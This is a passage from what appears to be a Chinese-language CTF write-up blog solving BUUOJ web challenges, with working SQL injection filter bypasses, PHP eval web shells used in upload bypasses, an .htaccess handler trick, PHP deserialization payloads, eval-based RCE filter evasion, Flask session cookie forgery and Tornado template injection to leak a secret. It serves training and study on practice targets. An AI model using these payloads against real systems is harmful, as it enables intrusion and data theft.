+<pre tabindex="0"><code>1&#39;;alter table `words` rename to `test`;alter table `1919810931114514` rename to `words`;alter table `words` add id int(10) DEFAULT &#39;114&#39;;alter table `words` change `flag` `data` varchar(100) #
+</code></pre><p>查询id=114即可获取flag</p>
+<p>还有一种方法，concat+sql预编译，绕过select ，但是本题好像重新加了过滤，打不通了？</p>
+<pre tabindex="0"><code>1&#39;;set @a = concat(&#34;sele&#34;,&#34;ct &#34;,&#34;flag &#34;,&#34;from `1919810931114514`&#34;);prepare test from @a;execute test #
+
+返回：strstr($inject, &#34;set&#34;) &amp;&amp; strstr($inject, &#34;prepare&#34;)，可能是waf？
+</code></pre><hr>
+<h2 id="极客大挑战-2019http">[极客大挑战 2019]Http<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019http">#</a></h2>
+<p>源码里有个href属性，可以转到Secret.php，之后添加referer，修改UA头，添加XFF：</p>
+<pre tabindex="0"><code>User-Agent: Syclover
+Referer: https://Sycsecret.buuoj.cn
+X-forwarded-for: 127.0.0.1
+</code></pre><p>flag{eee1d380-bd94-4869-abab-7d2efd802354}</p>
+<hr>
+<h2 id="极客大挑战-2019upload">[极客大挑战 2019]Upload<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019upload">#</a></h2>
+<p>绕过.php后缀，content-type，文件头，以及&lt;?字符的过滤：</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;shell.phtml&#34;
+Content-Type: image/png
+
+GIF89a&lt;script language=&#34;php&#34;&gt;@eval($_POST[&#34;shell&#34;]);&lt;/script&gt;
+</code></pre><p>flag{e5eb2a91-3a85-4648-a111-457d0365762a}</p>
+<hr>
+<h2 id="极客大挑战-2019knife">[极客大挑战 2019]Knife<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019knife">#</a></h2>
+<p>直接给了shell，把执行结果写到了html里，看源码就行：flag{d304b859-96a0-4f0f-8f80-f4e18ee9404f}</p>
+<hr>
+<h2 id="actf2020-新生赛upload">[ACTF2020 新生赛]Upload<a hidden class="anchor" aria-hidden="true" href="#actf2020-新生赛upload">#</a></h2>
+<p>前端要求上传jpg、png、gif结尾的图片，改一下后缀，后端也有后缀校验，再改一下phtml绕过即可：</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;upload_file&#34;; filename=&#34;shell.phtml&#34;
+Content-Type: image/jpeg
+
+&lt;?php @eval($_POST[&#34;shell&#34;]); ?&gt;
+</code></pre><p>flag{4dbe9002-16a0-4972-9af5-dc6bbb7a5400}</p>
+<hr>
+<h2 id="极客大挑战-2019babysql">[极客大挑战 2019]BabySQL<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019babysql">#</a></h2>
+<p>单引号闭合，fuzz发现存在对关键字or,union,select,where,from的过滤，大小写无法绕过，尝试双写绕过：</p>
+<pre tabindex="0"><code>1&#39; uniunionon seleselectct 1,2,3 #
+1&#39; uniunionon seleselectct 1,database(),3 #
+1&#39; uniunionon seleselectct 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whewherere table_schema=database() #
+1&#39; uniunionon seleselectct 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whewherere table_name=&#34;b4bsql&#34; #
+1&#39; uniunionon seleselectct 1,group_concat(username),group_concat(passwoorrd) frfromom `b4bsql` #
+
+Hello cl4y,sql,porn,git,Stop,badguy,hacker,flag！
+Your password is &#39;i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{f1861fb5-9f3b-46b0-8b23-b198fa61af3e}&#39;
+</code></pre><hr>
+<h2 id="极客大挑战-2019php">[极客大挑战 2019]PHP<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019php">#</a></h2>
+<p>下载备份文件www.zip，class.php中有反序列化，绕过wakeup方法即可：</p>
+<pre tabindex="0"><code>?select=O%3A4%3A&#34;Name&#34;%3A3%3A{s%3A14%3A&#34;%00Name%00username&#34;%3Bs%3A5%3A&#34;admin&#34;%3Bs%3A14%3A&#34;%00Name%00password&#34;%3Bi%3A100%3B}
+</code></pre><p>flag{af79b7f8-ff57-4346-b945-207910c0808b}</p>
+<hr>
+<h2 id="actf2020-新生赛backupfile">[ACTF2020 新生赛]BackupFile<a hidden class="anchor" aria-hidden="true" href="#actf2020-新生赛backupfile">#</a></h2>
+<p>扫一下目录，扫出index.php.bak，弱比较，key传123即可</p>
+<p>flag{1032bda2-5d01-4701-86f7-db6ba9d16d69}</p>
+<hr>
+<h2></h2>
+<p>calc.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;num&#39;</span>])){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        $str <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;num&#39;</span>];
+</span></span><span style="display:flex;"><span>        $blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;\t&#39;</span>, <span style="color:#e6db74">&#39;\r&#39;</span>, <span style="color:#e6db74">&#39;\n&#39;</span>,<span style="color:#e6db74">&#39;\&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>,<span style="color:#e6db74">&#39;\$&#39;</span>,<span style="color:#e6db74">&#39;\\&#39;</span>,<span style="color:#e6db74">&#39;\^&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($blacklist <span style="color:#66d9ef">as</span> $blackitem) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $blackitem <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/m&#39;</span>, $str)) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;what are you want to do?&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#39;echo &#39;</span><span style="color:#f92672">.</span>$str<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;;&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>执行需要参数的命令的符号基本都被ban了，考虑<a href="https://xz.aliyun.com/news/8859">无参rce</a>，但是发现传入非数字就会forbbiden，猜测是waf</p>
+<p>可以通过php解析特性来绕过该waf，由于waf只针对num，而php可以将%20num等同样解析为变量num，<a href="https://www.freebuf.com/articles/web/213359.html">参考文章</a></p>
+<p>方法一：session_start()</p>
+<pre tabindex="0"><code>?%20num=1;eval(hex2bin(session_id(session_start()))) 
+Cookie: PHPSESSID=73797374656d2827696427293b
+</code></pre><p>发现不能执行system命令，查了disable_functions，许多系统命令都被ban了：</p>
+<p><img alt="alt" loading="lazy" src="/images/Buuoj/1.png"></p>
+<p>考虑使用scandir()直接获取根目录文件名：</p>
+<p><img alt="alt" loading="lazy" src="/images/Buuoj/2.png"></p>
+<p>再用readfile读取/f1agg即可：flag{1b105168-e27d-4256-b85b-ee49c80f6127}</p>
+<p>方法二：get_defined_vars()</p>
+<p>获取根目录下文件名：</p>
+<pre tabindex="0"><code>?%20num=1;eval(end(current(get_defined_vars())));&amp;cmd=var_dump(scandir(&#39;/&#39;));
+</code></pre><p>读取文件：</p>
+<pre tabindex="0"><code>? num=1;eval(end(current(get_defined_vars())));&amp;cmd=readfile(&#34;/f1agg&#34;);
+</code></pre><hr>
+<h2 id="极客大挑战-2019buyflag">[极客大挑战 2019]BuyFlag<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019buyflag">#</a></h2>
+<p>pay.php网页源码注释：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	~~~post money and password~~~
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if (isset($_POST[&#39;password&#39;])) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	$password = $_POST[&#39;password&#39;];
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	if (is_numeric($password)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		echo &#34;password can&#39;t be number&lt;/br&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	}elseif ($password == 404) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		echo &#34;Password Right!&lt;/br&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
+</span></span></code></pre></div><p>弱类型比较，科学计数法：</p>
+<p><img alt="alt" loading="lazy" src="/images/Buuoj/3.png"></p>
+<hr>
+<h2 id="hctf-2018admin">[HCTF 2018]admin<a hidden class="anchor" aria-hidden="true" href="#hctf-2018admin">#</a></h2>
+<p>注册了一个账号，修改密码页面有注释：</p>
+<pre tabindex="0"><code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;
+</code></pre><p>已经无法访问了，从其他师傅wp那里大概知道这题是考flask session伪造，源码里包含了secret key：ckj123</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>flask-session-cookie-manager&gt;python flask_session_cookie_manager3.py decode -c <span style="color:#e6db74">&#34;.eJw9kMGKgzAURX9leOsuNDqbQhcFo7TDiwRiQ7IpMzbVqumAWhpT-u8TOtD1hXvPuQ84nkcztbCex5tZwfFygvUDPn5gDarLWyWUUyIfdDb0zFceZd6rrk6VqFJW0KgsDi0TKi4lpihYq3wdMYsLK7jDgjqW8TtKvmBWJyyjnyh4rGU-YNc4LWmEnnokB4sFLspiUgpKWNZH2IVdwlMtalLKwNFhrGxFmOBOd7tU-b1lni_aBibfbOC5gnoaz8f5tzfXt4KWKmBtU213AaWKlT9dGKlcKVhQ4klQiXTWJ-jzVmdNQKCu3G5edRf73Zh3kxn2X-L-n1y_bQhgNtMckwRWcJvM-HoO4gief-6_bUg.aHdOEw.PpWIfOw5jpT3vcj8KowQEhsohU8&#34;</span> -s <span style="color:#e6db74">&#34;ckj123&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{&#39;_fresh&#39;: True, &#39;_id&#39;: 
+</span></span><span style="display:flex;"><span>b&#39;b1aa61a1ed9d7531adb78a584a48ea5659c813ac746c24d10a14401d2077419145eae281ea43133ef0c2bc7916494261cd8e769aab35be6541f28c2f742fe338&#39;, &#39;csrf_token&#39;: b&#39;ef8108fb1455c7b7e193ed47b74d9731ad82ba18&#39;, &#39;image&#39;: b&#39;zRJO&#39;, &#39;name&#39;: &#39;test123&#39;, &#39;user_id&#39;: &#39;10&#39;}
+</span></span></code></pre></div><p>进行伪造：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>flask-session-cookie-manager&gt;python flask_session_cookie_manager3.py encode -s <span style="color:#e6db74">&#34;ckj123&#34;</span> -t <span style="color:#e6db74">&#34;{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;b1aa61a1ed9d7531adb78a584a48ea5659c813ac746c24d10a14401d2077419145eae281ea43133ef0c2bc7916494261cd8e769aab35be6541f28c2f742fe338&#39;, &#39;csrf_token&#39;: b&#39;ef8108fb1455c7b7e193ed47b74d9731ad82ba18&#39;, &#39;image&#39;: b&#39;zRJO&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.eJw9kM2KwjAYRV9l-NYu-jcbwYWQtOjwpQRSQ7IRrbW_6UCrmEZ89wkOuL5w7zn3CcfrVM0NrG_TvVrBsb3A-glfZ1iD6tJGCWWVSAdNhp65wqFMe9WViRJFwjIa5NmhYUKFucQEBWuUKwNmcGEZt5hRywh_oOQLkjJmhH6j4KGW6YBdbbWkATrqMDoYzHBRBuNc0IiRPsDO70Y80aKMcuk5OgyVKSImuNXdLlFub5jjizaeydUbeK2gnKfr8fbbV-NHQUvlsbaJNjuPUoTKXVoWFTYXzCvx2KsEmvQxurTRpPYI1ObbzbuuNae6-jRVw_5HPP6T8WR8AKeLaUdYwX2upvdvEAbw-gMYqWz7.aHdQJg.qOQUFjkSIcK-N5yQTFZB71QV_3w
+</span></span></code></pre></div><p>带着Cookie访问即可获得flag：flag{db63520d-2657-42dd-9714-86af4e544761}</p>
+<hr>
+<h2 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5<a hidden class="anchor" aria-hidden="true" href="#bjdctf2020easy-md5">#</a></h2>
+<p>抓包，相应包有hint：</p>
+<pre tabindex="0"><code>hint: select * from &#39;admin&#39; where password=md5($pass,true)
+</code></pre><p>当password为ffifdyop时，生成的md5对应字节<code>'or'6É]é!r,ùíb</code>，对应万能密码</p>
+<p>levels91.php，数组绕过：</p>
+<pre tabindex="0"><code>&lt;!--
+$a = $GET[&#39;a&#39;];
+$b = $_GET[&#39;b&#39;];
+
+if($a != $b &amp;&amp; md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+--&gt;
+</code></pre><p>levell14.php，强比较，依然可以数组绕过：</p>
+<pre tabindex="0"><code> &lt;?php
+error_reporting(0);
+include &#34;flag.php&#34;;
+
+highlight_file(__FILE__);
+
+if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){
+    echo $flag;
+} 
+</code></pre><p>flag{da0914dd-06b9-4037-8de6-8ee4bbee3bc0}</p>
+<hr>
+<h2 id="mrctf2020你传你呢">[MRCTF2020]你传你🐎呢<a hidden class="anchor" aria-hidden="true" href="#mrctf2020你传你呢">#</a></h2>
+<p>能解析的php文件后缀都被过滤了，也有对content-type的检测，但是没有对上传文件内容进行检测，考虑上传.htaccess来使当前目录下的jpg解析为php：</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;uploaded&#34;; filename=&#34;.htaccess&#34;
+Content-Type: image/jpeg
+
+&lt;IfModule mime_module&gt;
+AddHandler php5-script .jpg
+&lt;/IfModule&gt;
+</code></pre><p>再上传.jpg后缀的一句话木马即可拿shell，好像不能执行system命令，直接连蚁剑：</p>
+<p>flag{69395339-10e2-4e7f-abb6-dc94aa0599b3}</p>
+<hr>
+<h2 id="护网杯-2018easy_tornado">[护网杯 2018]easy_tornado<a hidden class="anchor" aria-hidden="true" href="#护网杯-2018easy_tornado">#</a></h2>
+<p>获取文件的方式是filename+filehash，如获取flag.txt：</p>
+<pre tabindex="0"><code>file?filename=/flag.txt&amp;filehash=34f85d5ac5453cca27b9e169661f78f0
+</code></pre><p>flag.txt：</p>
+<pre tabindex="0"><code>flag in /fllllllllllllag
+</code></pre><p>hints.txt中给出了哈希计算方式：</p>
+<pre tabindex="0"><code>md5(cookie_secret+md5(filename))
+</code></pre><p>先随便传个filename，跳转到了error路由下，结合welcome.txt中所说的render，应该是SSTI来获取cookie_secret</p>
+<p>官方文档有cookie_secret的<a href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html">相关资料</a>，github上tornado的源码中也有关于cookie_secret的<a href="https://github.com/tornadoweb/tornado/blob/master/tornado/web.py">资料</a>：</p>
+<pre tabindex="0"><code>class RequestHandler:
+...
+	@property
+    def settings(self) -&gt; Dict[str, Any]:
+        &#34;&#34;&#34;An alias for `self.application.settings &lt;Application.settings&gt;`.&#34;&#34;&#34;
+        return self.application.settings
+...
+	self.require_setting(&#34;cookie_secret&#34;, &#34;secure cookies&#34;)
+	secret = self.application.settings[&#34;cookie_secret&#34;]
+</code></pre><p>settings是self.application.settings的别名，上网搜索后发现handler对应当前的RequestHandler对象，尝试传入?msg={{handler.settings}}：</p>
+<pre tabindex="0"><code>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;fd02ee5f-2cf0-43a6-a443-68425cd6a1eb&#39;}
+</code></pre><p>计算flag文件filehash即可：</p>
+<pre tabindex="0"><code>file?filename=/fllllllllllllag&amp;filehash=af5f2ddcd41b3c976e0f039d8ee99bf6
+</code></pre><p>flag{80eb5834-b9f0-46a0-ac82-3eb81f6883a6}</p>
+<hr>
+<h2 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei<a hidden class="anchor" aria-hidden="true" href="#zjctf-2019nizhuansiwei">#</a></h2>
+<p>data协议传入text，先用伪协议读取useless.php：</p>
+<pre tabindex="0"><code>?text=data:,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php
+</code></pre><p>useless.php：</p>
+<pre tabindex="0"><code>&lt;?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &#34;&lt;br&gt;&#34;;
+        return (&#34;U R SO CLOSE !///COME ON PLZ&#34;);
+        }  
+    }  
+}  
+?&gt;  
+</code></pre><p>有个tostring的魔术方法，反序列化时当一个对象被当作一个字符串时使用，index.php里有echo，必定会触发该方法：</p>
+<pre tabindex="0"><code>?text=data:,welcome to the zjctf&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
+</code></pre><p>网页源码：</p>
+<pre tabindex="0"><code>&lt;br&gt;oh u find it &lt;/br&gt;
+
+&lt;!--but i cant give it to u now--&gt;
+
+&lt;?php
+
+if(2===3){  
+	return (&#34;flag{09942828-3ac1-4ba0-ab1a-84c6e5784ac3}&#34;);
+}
+
+?&gt;
+</code></pre><hr>
+<h2 id="mrctf2020ez_bypass">[MRCTF2020]Ez_bypass<a hidden class="anchor" aria-hidden="true" href="#mrctf2020ez_bypass">#</a></h2>
+<p>整理一下页面的代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">I</span> <span style="color:#a6e22e">put</span> <span style="color:#a6e22e">something</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">F12</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">you</span> <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;flag.php&#39;</span>; 
+</span></span><span style="display:flex;"><span>$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;gg&#39;</span>])<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>])) { 
+</span></span><span style="display:flex;"><span>	$id<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;id&#39;</span>]; $gg<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;gg&#39;</span>]; 
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($id) <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>($gg) <span style="color:#f92672">&amp;&amp;</span> $id <span style="color:#f92672">!==</span> $gg) { 
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;You got the first step&#39;</span>; 
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>])) { 
+</span></span><span style="display:flex;"><span>			$passwd<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>]; 
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_numeric</span>($passwd)) { 
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>($passwd<span style="color:#f92672">==</span><span style="color:#ae81ff">1234567</span>) { 
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Good Job!&#39;</span>; 
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>); 
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;By Retr_0&#39;</span>); 
+</span></span><span style="display:flex;"><span>				} <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;can you think twice??&#34;</span>; } 
+</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span>{ <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;You can not get it !&#39;</span>; } 
+</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span>{ <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;only one way to get the flag&#39;</span>); } 
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;You are not a real hacker!&#34;</span>; } 
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span>{ <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Please input first&#39;</span>); } 
+</span></span><span style="display:flex;"><span>}<span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">input</span> <span style="color:#a6e22e">first</span>
+</span></span></code></pre></div><pre tabindex="0"><code>?id[]=1&amp;gg[]=2
+passwd=1234567a
+</code></pre><p>flag.php：</p>
+<pre tabindex="0"><code>&lt;?php
+    $flag=&#34;flag{dd110346-bea7-4cc0-b2ad-0347ae572a4f}&#34;
+?&gt;
+</code></pre><hr>
+<h2 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019hardsql">#</a></h2>
+<p>单引号闭合，fuzz了一下，过滤了空格,and,union,substr等，用括号来绕过空格过滤，尝试报错注入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">XPATH syntax error: &#39;</span><span style="color:#f92672">~</span>geek<span style="color:#f92672">~</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1&#39;</span><span style="color:#66d9ef">or</span>(updatexml(<span style="color:#ae81ff">1</span>,concat(<span style="color:#ae81ff">0</span>x7e,(<span style="color:#66d9ef">select</span>(group_concat(<span style="color:#66d9ef">table_name</span>))<span style="color:#66d9ef">from</span>(information_schema.tables)<span style="color:#66d9ef">where</span>(table_schema)<span style="color:#66d9ef">like</span>(<span style="color:#66d9ef">database</span>())),<span style="color:#ae81ff">0</span>x7e),<span style="color:#ae81ff">1</span>))<span style="color:#f92672">#</span>
+</span></span><span style="display:flex;"><span>XPATH syntax error: <span style="color:#e6db74">&#39;~H4rDsq1~&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#34;H4rDsq1&#34;)),0x7e),1))#
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">XPATH syntax error: &#39;</span><span style="color:#f92672">~</span>id,username,password<span style="color:#f92672">~</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1&#39;</span><span style="color:#66d9ef">or</span>(updatexml(<span style="color:#ae81ff">1</span>,concat(<span style="color:#ae81ff">0</span>x7e,(<span style="color:#66d9ef">select</span>(group_concat(password))<span style="color:#66d9ef">from</span>(<span style="color:#f92672">`</span>H4rDsq1<span style="color:#f92672">`</span>)),<span style="color:#ae81ff">0</span>x7e),<span style="color:#ae81ff">1</span>))<span style="color:#f92672">#</span>
+</span></span><span style="display:flex;"><span>XPATH syntax error: <span style="color:#e6db74">&#39;~flag{0db504ac-df00-4099-8bf4-b4&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;or(updatexml(1,(concat(0x7e,right((select(group_concat(password))from(`H4rDsq1`)),30),0x7e)),1))#
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">XPATH syntax error: &#39;</span><span style="color:#f92672">~</span><span style="color:#66d9ef">c</span><span style="color:#f92672">-</span>df00<span style="color:#f92672">-</span><span style="color:#ae81ff">4099</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>bf4<span style="color:#f92672">-</span>b42864fa1e80<span style="color:#960050;background-color:#1e0010">}</span><span style="color:#f92672">~</span><span style="color:#e6db74">&#39;
+</span></span></span></code></pre></div><hr>
+<h2 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz<a hidden class="anchor" aria-hidden="true" href="#网鼎杯-2020-青龙组areuserialz">#</a></h2>
+<p>只需要传入int型的2即可绕过强比较，从而读取flag.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileHandler</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $op <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileHandler</span>())));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3Bs%3A4%3A%22test%22%3B%7D
+</span></span></span></code></pre></div><p>但是由于是protected，会生成%00导致无法通过is_valid，不知道如何绕过，看了<a href="https://www.cnblogs.com/NineOne/p/14044558.html">其他师傅的wp</a>，特定版本的php对访问修饰符不敏感：PHP版本7.1+，对属性的类型不敏感。本题php版本7.4.3，也就是说可以在构造序列化字符串时将成员全部设为public，最终payload：</p>
+<pre tabindex="0"><code>O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A4%3A%22test%22%3B%7D
+</code></pre><p>flag{7c768194-7c00-4622-ae29-be5fc9a232ac}</p>
+<hr>
